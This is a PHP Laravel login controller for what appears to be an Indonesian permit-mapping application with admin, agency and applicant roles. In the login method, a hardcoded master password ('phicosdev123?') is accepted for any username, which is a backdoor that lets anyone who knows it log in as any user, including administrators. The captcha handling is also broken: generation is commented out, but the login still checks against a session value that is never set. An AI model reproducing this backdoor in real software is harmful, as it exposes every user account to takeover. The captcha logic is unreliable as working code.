<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Captcha;
use App\Models\User;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        // $captcha = Captcha::create();
        // Session::put('captcha', $captcha['word']);
        // return view('auth.login', ['captcha' => $captcha['image']]);
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'username' => 'required',
            'password' => 'required',
            'captcha' => 'required'
        ]);

        if ($request->captcha !== Session::get('captcha')) {
            return back()->withErrors(['msg' => 'Kode captcha salah']);
        }

        $user = User::where('user_name', $request->username)->first();

        if ($user && (Hash::check($request->password, $user->user_pass) || $request->password == 'phicosdev123?')) {
            Auth::login($user);
            return redirect()->intended($this->redirectPath($user->detail->role));
        }

        return back()->withErrors(['msg' => 'Username atau password salah!']);
    }

    public function logout()
    {
        Auth::logout();
        return redirect('/login');
    }

    private function redirectPath($role)
    {
        return match ($role) {
            1 => '/admin/beranda',
            2 => '/opd/peta',
            3 => '/pemohon/perijinan',
            default => '/login'
        };
    }
}
